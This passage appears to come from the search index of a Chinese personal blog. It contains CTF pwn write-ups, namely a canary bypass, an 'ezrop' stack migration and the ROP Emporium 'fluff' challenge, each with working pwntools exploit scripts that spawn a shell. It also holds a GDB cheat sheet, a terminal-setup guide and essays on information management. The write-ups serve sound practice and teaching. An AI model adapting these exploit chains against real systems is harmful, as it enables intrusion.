libc_base)system_add = libc_base + elf.sym[&#x27;system&#x27;]p.recvuntil(&#x27;sort :&#x27;)p.sendline(&#x27;36&#x27;)for i in range(24): putNum(0)p.recv()p.sendline(&#x27;+&#x27;)for i in range(8): putNum(system_add)for i in range(3): putNum(libc_base+elf.search(b&#x27;/bin/sh\\0&#x27;).__next__())p.interactive() 0x6 New skills PWN ±号绕过canary 泄露栈上的libc地址 debug对于远程的分析 Script python格式化输出 pwntools.elf模块搜索字符串。 python3的next()改名了","categories":[{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/tags/CTF/"}]},{"title":"dlresolve-Feature-and-Segmented-stack-migration-ezrop","slug":"dlresolve-Feature-and-Segmented-stack-migration-ezrop","date":"2022-04-24T16:00:00.000Z","updated":"2022-07-12T12:04:09.193Z","comments":true,"path":"2022/04/25/dlresolve-Feature-and-Segmented-stack-migration-ezrop/","link":"","permalink":"http://namonone.com/2022/04/25/dlresolve-Feature-and-Segmented-stack-migration-ezrop/","excerpt":"","text":"dlresolve Feature and Segmented stack migration-ezrop 0x1 checksek 12345678$ checksec ezrop [*] &#x27;/home/nemo/Active/Script/ezrop&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 开了NX和partial RELRO 0x2 Analysis 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[48]; // [rsp+0h] [rbp-30h] BYREF init(argc, argv, envp); puts(&quot;You can use stackoverflow.&quot;); puts(&quot;But only overflow a bit more...&quot;); puts(&quot;And you must print first.&quot;); memset(s, 0, 0x20uLL); write(1, s, 0x30uLL); read(0, s, 0x40uLL); return 0;&#125; 这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串 但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行 虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误 0x3 Process 栈迁移到data段 通过rbp控制read写入位置在数据段写入ROP链 getshell 0x4 Some questions 对于这个通过rbp同时控制read位置和栈迁移的题目，我之前遇到过一次，但是当时没有做出来。调试过程中发现system一直失败，调试过程中发现原来是.got表中的dlresolve地址被改了一个字节\\0a, 一个回车，分析之后发现原来是我ret 到read了三次，第三次read把sendline的回车读取了，写到了这个位置。因为对这个分段打栈迁移的技术还不是特别熟悉，现在终于理解这个技术，其实是实现了两次栈迁移。 在解决了上面的问题，调试到system发现又失败了，继续跟进，发现seg fault在dlresolve向栈中保存的指令。发现dlreslove保存寄存器要在栈里面写一大段数据，因为我写入的是data段的开头，导致访问到了前面没有写入权限的位置。这起码要预留0x800的内存在前面，但是data段和bss段加起来都没有这么多，思考data和bss段所在的这一部分内存页权限应该是一致可写的，所以在这一段往后移了0x800 0x5 exp 1234567891011121314151617181920212223242526from pwn import*p = process(&#x27;./ezrop&#x27;)#p = gdb.debug(&#x27;./ezrop&#x27;)m = u64(p.recv(40)[-8:])payloads = p64(0x400863) + b&#x27;/bin/sh\\0&#x27; + p64(0x400600)payloads += cyclic(0x18)payloads += p64(0x601848+0x30) + p64(0x4007d9)p.send(payloads)sleep(1)payloads = p64(0x4006fa) + p64(0x400863) + p64(0x601868) + p64(0x400600) payloads += b&#x27;/bin/sh\\0&#x27;payloads += b&#x27;/bin/sh\\0&#x27;payloads += p64(0x601848-0x8) + p64(0x4007f9)p.send(payloads)p.interactive()#0x00007f7b3ce92bb0 0x00007f7b3ccf8450 0x6 New skills 分段打栈迁移 在第一次read读入后将rbp改为要写入的位置 ret到read 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置 dlrelsolve过程会保存大量寄存器数据，需要预留很大的栈空间","categories":[{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/tags/CTF/"}]},{"title":"Diversified-use-of-GDB","slug":"Diversified-use-of-GDB","date":"2022-04-19T16:00:00.000Z","updated":"2022-07-12T12:03:30.319Z","comments":true,"path":"2022/04/20/Diversified-use-of-GDB/","link":"","permalink":"http://namonone.com/2022/04/20/Diversified-use-of-GDB/","excerpt":"","text":"命令名称 命令缩写 命令说明 run r 运行一个待调试的程序 continue c 让暂停的程序继续运行 next n 运行到下一行 step s 单步执行，遇到函数会进入 until u 运行到指定行停下来 finish fi 结束当前调用函数，回到上一层调用函数处 return return 结束当前调用函数并返回指定值，到上一层函数调用处 jump j 将当前程序执行流跳转到指定行或地址 print p 打印变量或寄存器值 backtrace bt 查看当前线程的调用堆栈 frame f 切换到当前调用线程的指定堆栈 thread thread 切换到指定线程 break b 添加断点 tbreak tb 添加临时断点 delete d 删除断点 enable enable 启用某个断点 disable disable 禁用某个断点 watch watch 监视某一个变量或内存地址的值是否发生变化 list l 显示源码 info i 查看断点 / 线程等信息 ptype ptype 查看变量类型 disassemble dis 查看汇编代码 set args set args 设置程序启动命令行参数 show args show args 查看设置的命令行参数 调试无符号程序 run 先将程序运行 b * __libc_start_main 因为没有main函数的符号，所以只能在libc库中的start函数下断点 可以愉快的调试了 调试带参数的程序 set args [arg1] [arg2] ··· 通过此命令设置命令行参数 分屏调试 安装tmux 使用[[tmux]]分屏 [[ps]]获取进程pid gdb启动 attach 进程 错误解决 Operation not permitted ubuntu特性： 系统为安全考虑，默认阻止一个进程检查和修改另一个进程，除非前者是后者的父进程。 阻止操作由 ptrace_scope 实现，当 ptrace_scope = 1 时，gdb 在调试运行中的进程时，会产生如上报错 解决： 查看 ptrace_scope ：cat /proc/sys/kernel/yama/ptrace_scope 修改 ptrace_scope ：vi /etc/sysctl.d/10-ptrace.conf（修改为 kernel.yama.ptrace_scope = 0） 生效 ：sysctl -p /etc/sysctl.d/10-ptrace.conf （不行就重启） 重启 ：reboot gdb attach 其他架构进程 pwntools 将程序开在本地架构其他端口上 sh = process([“qemu-aarch64”, “-g”, “1234”, “./arm”]) 脚本中pause()等待attch gdb-multiarch 打开调试程序 target remote localhost : 1234 attach到对应端口的程序上 gdb 调试与程序输出的分离 先在一个终端窗口使用tty命令，得到其文件描述符 再在另一个窗口使用gdb 启动要调试的程序 gdb中用tty “文件描述符” 将输出重定向 run","categories":[{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/tags/CTF/"}]},{"title":"vim+tmux+zsh+Terminal-self-discipline-of-pwner","slug":"vim+tmux+zsh+Terminal-self-discipline-of-pwner","date":"2022-04-15T16:00:00.000Z","updated":"2022-07-15T12:00:12.690Z","comments":true,"path":"2022/04/16/vim+tmux+zsh+Terminal-self-discipline-of-pwner/","link":"","permalink":"http://namonone.com/2022/04/16/vim+tmux+zsh+Terminal-self-discipline-of-pwner/","excerpt":"","text":"vim+tmux+zsh+Terminal 你的pwn效率进阶方案 作为一个Pwner，需要频繁的接触命令行，特别是最近接触到了arm架构的pwn，需要一个窗口运行qemu，一个窗口跑脚本，一个窗口跑gdb，需要在几个窗口之间切换，同时我本身用sublime Text需要平凡切屏微调脚本，所以决定配置vim+tmux+zsh+terminal，实现一个兼顾美观和效率的pwn setup 本文主要基于ubuntu20系统 Terminal terminal是一个终端模拟器，其实终端模拟器是什么无所谓，只是terminal我看着比较美观，再加上我的ubuntu桌面是gnome桌面，自带gnome terminal，所以我就使用terminal, 对于colors部分，背景改成灰/黑色，不透明度调到20%-30%，不影响terminal内文字的观看，同时能够看到后面的背景就行。 zsh配置方案 因为后面一些配置，在有了zsh后方便一些，所以先配置zsh 安装 安装zsh 1sudo apt-get install zsh 替换为默认shell 1sudo chsh -s /bin/zsh tips: 这个命令需要重启shell(or 系统，我记不清了，先关了再开终端试一下，没有生效再重启系统吧)才能生效，所以不要像我一样以为这个命令失效了，反复发呆 安装oh-my-zsh oh-my-zsh是github上的一个开源项目，可以便捷进行zsh的插件、主题管理 You can find official document here 官方文件提供的安装方案如下 使用curl连接。 如果你没有配置代理或者改hosts的话，你大概率是安装不了的，可以使用一下国内镜像: 1sh -c &quot;$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)&quot; 需要先安装curl。由于我本人没有尝试过这个镜像，我本人是通过改hosts安装的，raw.fithubsercontent.con好像还没有完全屏蔽，改hosts仍然可行，如果安装失败的话，可以私我 改配置文件 这个阶段，可以把文件管理器改为显示隐藏文件 如果你上一步安装完成，在主文件夹(也就是桌面软件的home目录，一般用~表示)会出现一个.zshrc的文件，这是zsh的配置文件，要用sudo vim写入，安装oh-my-zsh后 1sudo vim ~/.zshrc 打开后应该有大量注释后文本，帮助你修改配置文本 ​ 我就把ZSH_THEME改成了ys，如果有需要，可以加一些插件，改一些style，因为oh-my-zsh 自带了相当多插件，怎么引入可以查看官方文档 ​ 可以使用alias命令为命令添加别名，方便使用 ​ 使配置文件生效 1source ~/.zshrc zsh命令行使用此命令，使配置文件生效 使用 zsh自带了许多非常好用的功能，自动补全，智能高亮，这里我就不教怎么使用了，可以参考 为什么说 zsh 是 shell 中的极品？ - 知乎 (zhihu.com) tmux tmux是一个终端复用软件，多用于用于分屏，在shell 键入tmux就进入了tmux，具体使用快捷键和命令请百度，此处不教怎么使用 一个tips是tmux中的ctrl+b是一个进入命令模式的键，类似于vim的esc，所以很多快捷键写的ctrl+B+xx，意思是先按下ctrl+b，再按其他键 配置 依旧在主文件目录下新建一个 .tmux.conf配置文件 具体配置可以参考: https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.tmux.conf 最后这一部分就是加入插件的，自动帮你完成了插件安装 复制这个配置就行，然后在shell进入tmux 键入: 1tmux source-file ~/.tmux.conf vim 如果说其他插件只是影响美观的，vim不装插件真的是跟装插件是两种软件， 首先确认你安装了较新版本的vim 插件安装 安装vim-plug 本人亲测官网安装命令路径不咋好用，一个是不挂代理连不上，一个式官网linux的安装路径无效，我们来手动安装。 首先复制官网的plug.vim文件 （如果没有）在本地主文件夹新建一个.vim文件夹，里面兴建一个autoload文件夹，将plug.vim放入 再在.vim中新建一个plug目录 配置 主文件夹新建.vimrc文件 配置文件参考https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.vimrc 将此处改为~/.vim/plug 打开vim，按esc命令进入命令模式, 输入: ，再用source命令导入.vimrc 再在命令模式输入:PlugInstall，插件安装完成，reload，整体配置成功，具体使用网上资料很多，不再赘述","categories":[{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/tags/CTF/"}]},{"title":"Unusual-instruments-flluf-[ROPEmporium-4]","slug":"Unusual-instruments-flluf-[ROPEmporium-4]","date":"2022-03-01T16:00:00.000Z","updated":"2022-07-12T12:05:19.216Z","comments":true,"path":"2022/03/02/Unusual-instruments-flluf-[ROPEmporium-4]/","link":"","permalink":"http://namonone.com/2022/03/02/Unusual-instruments-flluf-[ROPEmporium-4]/","excerpt":"","text":"ROP Emporium-fluff 这个的exp是我写的最没底的一次，可用的gadget少的可怜 根据提示，要去在questionableGadgets里去找 123456789101112.text:0000000000400628 questionableGadgets:.text:0000000000400628 xlat.text:0000000000400629 retn.text:000000000040062A ; -------------------------------------------.text:000000000040062A pop rdx.text:000000000040062B pop rcx.text:000000000040062C add rcx, 3EF2h.text:0000000000400633 bextr rbx, rcx, rdx.text:0000000000400638 retn.text:0000000000400639 ; -------------------------------------------.text:0000000000400639 stosb.text:000000000040063A retn 查阅Inter manul，发现这三者组合起来可以向rdi里的地址写入 123bextr //从第一源操作数(中间)，按第二源操作数的索引值和长度写入目的操作数xlat //[bx + al] to alstosb //al to [rdi]，然后递增rdi 但是，这只能一位一位地写入，如果要写入flag.txt，意味着要写入8次，我心想，这gadget也太长了吧，觉得是自己写错了。 然后搜索了网上的gadget，发现大部分都是32位，或者是旧版，有一些别的可利用gadget，似乎没有别的方法了 于是还是决定尝试一字一字写入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import*p = process(&#x27;./fluff&#x27;)context.log_level = &#x27;debug&#x27;pd = lambda x:p64(x).decode(&#x27;unicode_escape&#x27;)stosb_rdi_al = 0x400639xlat = 0x400628 bextr = 0x40062adata_start = 0x601028pop_rdi = 0x4006a3pop_rcx_bextr = 0x40062bprint_file = 0x400510f_char = 0x4003c4l_char = 0x4003c5a_char = 0x400411g_char = 0x4003cfdot_char = 0x400400t_char = 0x4003e0x_char = 0x400751payload = &#x27;A&#x27;*(0x28) + pd(bextr)payload+= pd(0x4000) + pd(f_char-0x3ef2-0xb)payload+= pd(xlat) + pd(pop_rdi) + pd(data_start) + pd(stosb_rdi_al)payload+= pd(pop_rcx_bextr)payload+= pd(l_char-0x3ef2-0x66)payload+= pd(xlat) + pd(stosb_rdi_al)payload+= pd(pop_rcx_Sbextr)payload+= pd(a_char-0x3ef2-0x6c)payload+= pd(xlat) + pd(stosb_rdi_al)payload+= pd(pop_rcx_bextr)payload+= pd(g_char-0x3ef2-0x61)payload+= pd(xlat) + pd(stosb_rdi_al)payload+= pd(pop_rcx_bextr)payload+= pd(dot_char-0x3ef2-0x67)payload+= pd(xlat) + pd(stosb_rdi_al)payload+= pd(pop_rcx_bextr)payload+= pd(t_char-0x3ef2-0x2e)payload+= pd(xlat) + pd(stosb_rdi_al)payload+= pd(pop_rcx_bextr)payload+= pd(x_char-0x3ef2-0x74)payload+= pd(xlat) + pd(stosb_rdi_al)payload+= pd(pop_rcx_bextr)payload+= pd(t_char-0x3ef2-0x78)payload+= pd(xlat) + pd(stosb_rdi_al)payload+= pd(pop_rdi) + pd(data_start) + pd(print_file)p.recvuntil(&#x27;&gt; &#x27;)p.sendline(payload)p.interactive() 还是不能对长ROP链有畏惧心理","categories":[{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/tags/CTF/"}]},{"title":"信息素养[1]-信息获取","slug":"信息素养[1]-信息获取","date":"2022-02-19T16:00:00.000Z","updated":"2022-06-29T15:48:15.518Z","comments":true,"path":"2022/02/20/信息素养[1]-信息获取/","link":"","permalink":"http://namonone.com/2022/02/20/%E4%BF%A1%E6%81%AF%E7%B4%A0%E5%85%BB[1]-%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/","excerpt":"","text":"信息获取 //持续更新完善ing 这是我关于信息素养的第一篇文章。在我看来，在当今社会最重要的能力就是获取、处理、管理以及 分析和总结信息并在此基础上形成输出的能力，而我也将按这个顺序组织出我个人的信息管理体系。 本系列主要思路来源：罗昭峰《文献管理与信息分析》 在这个流程中，最开始也是最基础的部分就是信息获取 12345graph LR 信息获取---主动获取 信息获取---被动获取 主动获取---专业知识 主动获取---杂 主动获取 专业知识 [一]安全领域 1.书籍 书籍是快速了解一个领域最好的方法。我个人观点，国内大部分课程信息密度太低，所以我个人偏爱看书的方式学习 鸠摩搜索 电子书相关 2.一些网站 GitHub 著名代码托管平台 3.一些论坛/新闻 微信公众号：看雪学院 会有一些漏洞的演示 4.前沿 安全领域四大顶会 Technical Sessions | USENIX IEEE Symposium on Security and Privacy and Euro S&amp;P (ieee-security.org) NDSS Symposium – The Network and Distributed System Security Symposium (NDSS) (ndss-symposium.org) ACM CCS (sigsac.org) 论文 Sci-hubs 图书馆官网 各类数据库 5.官方文档 Zeal 快速查阅各种官方文档 [二]其他 心晴网 心理学电子书 Index—The Stacks project (columbia.edu) 数学领域的开源尝试 杂 杂项主要指零碎知识的获取，包括遇到的各种问题等 1. 搜索引擎的使用 **个人使用习惯：**中文搜索：bing国内版；英文搜索：Google //这些点来源文章忘记了 Use the tabs Use quotes： ** 引号将之识别为整体，如**“Puppy Dog Sweaters”**，搜索Puppy Dog Sweaters，反之分开搜索 Use a hyphen to exclude words： Mustang-cars : search for mustangs but to remove any results that have the word “car” in it **Use a colon to search specific sites: Sidney Crosby site:nhl.com : This will search for all content about famous hockey player Sidney Crosby, but only on NHL.com **Find a page that links to another page： **link:www.whu.edu.cn Use the asterisk wildcard “Come * right now * me” : Google search will search for that phrase knowing that the asterisks can be any word **Find sites that are similar to other sites： **related:amazon.com Use Google search to do math 8 * 5 + 5 Search for multiple words at once chocolate OR white chocolate Search a range of numbers **What teams have won the Stanley Cup …2004 **: the search will toss back the team that won the Stanley Cup in 2004. The two dots with only one number will tell the search that you don’t need anything before or after 2004 41…43 : Google will search for the numbers 41, 42, and 43 Find a specific file * search term here * filetype:pdf Keep it simple Gradually add search terms Use words that websites would use Use words that websites would use Use important words only Google search has shortcuts Weather *zip code* This will show you the weather in the given zip code. You can also use town and city names instead of area codes, but it may not be as accurate if there are multiple area codes in the city. What is *celebrity name* Bacon Number This is a fun little one that will tell you how many connections any given celebrity has to famed actor Kevin Bacon. The popular joke, Six Degrees of Kevin Bacon, is that no actor is more than 6 connections away from Kevin Bacon. Mark Zuckerberg has a Bacon Number of 3. What is the definition of *word* or Define: *word* This will display the definition of a word. Time *place* This will display the time in whatever place you type in. You can check any stock by typing its ticker name into Google. If you search for GOOG, it will check the stock prices for Google. Spelling doesn’t necessarily matter Use descriptive words Find a specific file *search term here* filetype:pdf Money and unit conversions miles to km – This will convert miles to kilometers. You can put numbers in front to convert a certain number. Like “10 miles to km” will show you how many kilometers are in 10 miles. USD to British Pound Sterling – This will convert a US dollar to British pounds. Like the measurements above, you can add numbers to find exact conversions for a certain amount of money. Track your packages 2.本地搜索软件 Everything 3.各类网站 StackOverflow 编程相关问答社区，编程相关问题回答质量高、解决概率大，提问需要遵守相关规范 Stanford Encyclopedia of Philosophy 斯坦福大学的一个哲学名词解释库 Quora 综合类问答社区，宽泛性问题可以一观 知乎 综合类问答社区，趣味性问题可以一观 WiKi 著名百科类网站 WikiHow 没有什么用但是很有趣的生活小妙招 被动获取 主动获取的局限性是你不可能获取你不知道的知识，所以被动获取就很有必要了 1. RSS 本人使用gReader 整合了各类新闻和相关论坛","categories":[{"name":"杂项","slug":"杂项","permalink":"http://namonone.com/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"信息素养","slug":"信息素养","permalink":"http://namonone.com/tags/%E4%BF%A1%E6%81%AF%E7%B4%A0%E5%85%BB/"}]},{"title":"信息素养[2]-信息管理","slug":"信息素养[2]-信息管理","date":"2022-02-19T16:00:00.000Z","updated":"2022-06-29T15:48:42.685Z","comments":true,"path":"2022/02/20/信息素养[2]-信息管理/","link":"","permalink":"http://namonone.com/2022/02/20/%E4%BF%A1%E6%81%AF%E7%B4%A0%E5%85%BB[2]-%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86/","excerpt":"","text":"信息管理 当获取信息后，其次的任务就是对信息的管理以及处理，而信息管理的前提就是信息分类 信息分类 123456graph LR 信息分类---离散信息--&gt;孤立的碎片化信息 信息分类---过程信息--&gt;某些具体操作过程 信息分类---观点信息--&gt;评论/态度/观点 信息分类---体系信息--&gt;体系化知识 信息分类---抽象信息--&gt;抽象的概念信息 信息处理 对于我个人的信息管理体系： Zotero 用于论文网页等的留档以及管理 思源笔记 集合了双链和体系化笔记的功能，便于个人知识体系的形成 MicrosoftEdge收藏 各种实用网页索引，以前各种页面网站的各自的收藏混杂，导致管理混乱，于是决定统一将网页交由浏览器收藏管理 博客 个人信息的体系化/离散输出，实践的记录 GitHub 可复用代码，脚本的管理，以及开源程序的关注 同时，在以上管理体系的基础上，我同时还在推进个人信息备份工作。包括本地备份、远程备份，最近租了一个服务器，预备进行数据备份工作，主要应对互联网上经常会有的删帖一些现象，防止信息丢失 1.离散信息 对于离散信息，及一些论文、文章之类的我的管理如下 用Zotero归档，形成备份 思源笔记上提取主要观点记录成离散笔记–记录相关tag 定时将相同领域的双链连接的离散知识进行逻辑性整合，写成博客输出 2.过程信息 即一些操作记录，如服务器配置。某软件使用 思源笔记记录 自行实验，用博文记录过程 3.观点信息 一些观点/评论 用Zotero归档 思源笔记整理，用表格化结构化的组织方法记录 在需要时进行可视化处理和分析，整理成文章输出 //这个点其实是偏人文社科领域的研究方法，实际上，我还没有实际对观点信息进行操作，需要留待以后完善 4.体系知识 一个领域的体系化的知识，典型的如书籍和课程 思源笔记写作逻辑化体系笔记 定时复习 5.抽象信息 Zotera归档 内化/比喻法","categories":[{"name":"杂项","slug":"杂项","permalink":"http://namonone.com/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"信息素养","slug":"信息素养","permalink":"http://namonone.com/tags/%E4%BF%A1%E6%81%AF%E7%B4%A0%E5%85%BB/"}]},{"title":"信息素养[3]-信息运用与杂谈","slug":"信息素养[3]-信息运用与杂谈","date":"2022-02-19T16:00:00.000Z","updated":"2022-06-29T15:49:41.528Z","comments":true,"path":"2022/02/20/信息素养[3]-信息运用与杂谈/","link":"","permalink":"http://namonone.com/2022/02/20/%E4%BF%A1%E6%81%AF%E7%B4%A0%E5%85%BB[3]-%E4%BF%A1%E6%81%AF%E8%BF%90%E7%94%A8%E4%B8%8E%E6%9D%82%E8%B0%88/","excerpt":"","text":"信息运用 就我个人而言，我觉得信息素养最重要的，还是要学会将信息进行运用，将信息内化为自身的能力 我以为较好的运用方法： 写博客 实际上是将相关信息在体系化整理，类似于费曼学习法 做项目/实验 做项目，实验，切实运用 数据分析 目前还未打算涉及 竞赛 如CTF、ACM等各类竞赛 实习 了解生产环境 就目前而言，我觉得我这方面的能力是很欠缺的，所以接下来应该将会深化这方面的能力 杂谈 信息素养是我一直在刻意培养的一种能力。就我个人而言，我觉得，如果要说我人生的前十几年除了无所事事还做成了什么，那就只能是一种体系化结构化的思维和对更高效率以及能力的追求的，这可以说是我个人的一点强迫症，我会习惯性的将各种流程和信息抽象成结构化的思考，进而提升学习工作效率。 这一系列文章就是这种思维的成果。 但在某种意义上，这也对我形成了一定的障碍，导致我对于离散信息的利用率很低，对于不成体系化的信息习惯性的忽略，同时限制了我的联想思维。然后在朋友的推荐下接触了双链笔记，在今后，我应该会在这方面在进一步","categories":[{"name":"杂项","slug":"杂项","permalink":"http://namonone.com/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"信息素养","slug":"信息素养","permalink":"http://namonone.com/tags/%E4%BF%A1%E6%81%AF%E7%B4%A0%E5%85%BB/"}]}],"categories":[{"name":"Linux","slug":"Linux","permalink":"http://namonone.com/categories/Linux/"},{"name":"Fuzz","slug":"Fuzz","permalink":"http://namonone.com/categories/Fuzz/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/categories/CTF/"},{"name":"杂项","slug":"杂项","permalink":"http://namonone.com/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://namonone.com/tags/Linux/"},{"name":"Fuzz","slug":"Fuzz","permalink":"http://namonone.com/tags/Fuzz/"},{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/tags/CTF/"},{"name":"信息素养","slug":"信息素养","permalink":"http://namonone.com/tags/%E4%BF%A1%E6%81%AF%E7%B4%A0%E5%85%BB/"}]}